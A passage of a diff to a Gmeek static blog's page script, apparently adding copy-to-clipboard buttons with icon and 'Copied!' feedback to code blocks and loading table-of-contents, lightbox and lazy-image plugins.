1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
 var utterancesLoad=0;
 
 console.log("\n %c Gmeek main https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
@@ -383,7 +375,70 @@ function iFrameLoading(){
     }
 }
 
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
 
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
 
 </script>
 </script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>
